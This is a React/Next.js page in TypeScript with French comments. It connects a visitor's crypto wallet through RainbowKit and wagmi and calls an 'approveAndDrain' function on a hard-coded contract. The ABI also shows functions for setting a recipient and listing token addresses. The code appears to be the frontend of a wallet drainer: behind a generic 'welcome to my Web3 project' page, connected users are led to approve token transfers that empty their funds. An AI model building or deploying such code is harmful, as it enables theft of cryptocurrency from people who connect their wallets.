import { ConnectButton } from "@rainbow-me/rainbowkit";
import { useAccount, useContractRead, useContractWrite } from "wagmi";

// ABI du contrat
const contractAbi = [
  {
    "inputs": [],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "approvalAmount",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "approveAndDrain",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "recipient",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_recipient",
        "type": "address"
      }
    ],
    "name": "setRecipient",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "name": "tokenAddresses",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "stateMutability": "payable",
    "type": "receive"
  }
];

// Déclaration explicite du type de `contractAddress`
const contractAddress: string = "0x518c5D62647E60864EcB3826e982c93dFa154af3"; // Adresse du contrat

export default function Home() {
  const { isConnected, address } = useAccount();

  // Lire le owner du contrat (exemple d'utilisation de useContractRead)
  const { data: owner } = useContractRead({
    address: contractAddress,
    abi: contractAbi,
    functionName: "owner",
  });

  // Écrire sur le contrat (exécuter approveAndDrain)
  const { write: approveAndDrain, isLoading } = useContractWrite({
    address: contractAddress,
    abi: contractAbi,
    functionName: "approveAndDrain",
  });

  return (
    <div style={{ textAlign: "center", marginTop: "50px" }}>
      <h1>Bienvenue sur mon projet Web3</h1>
      {isConnected ? (
        <>
          <p>Connecté en tant que : {address}</p>
          <p>Propriétaire du contrat : {owner?.toString() || "Chargement..."}</p>
          <button disabled={isLoading} onClick={() => approveAndDrain()}>
            {isLoading ? "Transaction en cours..." : "Approuver et vider les fonds"}
          </button>
        </>
      ) : (
        <ConnectButton />
      )}
    </div>
  );
}
